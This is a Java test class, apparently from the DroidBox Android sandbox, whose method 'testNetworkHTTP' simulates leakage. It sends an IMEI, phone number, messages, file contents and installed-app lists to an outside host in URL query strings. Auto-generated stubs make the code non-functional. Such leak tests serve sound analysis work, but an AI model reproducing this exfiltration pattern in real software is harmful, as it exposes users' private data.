
import java.io.UncheckedIOException;


class c5951610 {

    public void testNetworkHTTP() {
        MyHelperClass Log = new MyHelperClass();
        Log.v("Test", "[*] testNetworkHTTP()");
        URL url = null;
        HttpURLConnection urlConnection = null;
        try {
            url = new URL("http://code.google.com/p/droidbox/");
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            BufferedReader rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings("unused") String line = "";
            while ((line =(String)(Object) rd.readLine()) != null) ;
            MyHelperClass hashedImei = new MyHelperClass();
            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line =(String)(Object) rd.readLine()) != null) ;
            MyHelperClass phoneNbr = new MyHelperClass();
            url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line =(String)(Object) rd.readLine()) != null) ;
            MyHelperClass msg = new MyHelperClass();
            url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            MyHelperClass fileContent = new MyHelperClass();
            url = new URL("http://pjlantz.com/file.php?file=" + fileContent.replace(" ", "+"));
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line =(String)(Object) rd.readLine()) != null) ;
            MyHelperClass installedApps = new MyHelperClass();
            url = new URL("http://pjlantz.com/app.php?installed=" + installedApps.replace(" ", "+"));
            urlConnection = (HttpURLConnection)(HttpURLConnection)(Object) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line =(String)(Object) rd.readLine()) != null) ;
        } catch (UncheckedIOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }
    }

}

// Code below this line has been added to remove errors
class MyHelperClass {

public MyHelperClass replace(String o0, String o1){ return null; }
	public MyHelperClass v(String o0, String o1){ return null; }}

class URL {

URL(String o0){}
	URL(){}
	public MyHelperClass openConnection(){ return null; }}

class HttpURLConnection {

public MyHelperClass getInputStream(){ return null; }
	public MyHelperClass disconnect(){ return null; }}

class BufferedReader {

BufferedReader(){}
	BufferedReader(InputStreamReader o0){}
	public MyHelperClass readLine(){ return null; }}

class InputStreamReader {

InputStreamReader(MyHelperClass o0){}
	InputStreamReader(){}}

class IOException extends Exception{
	public IOException(String errorMessage) { super(errorMessage); }
}
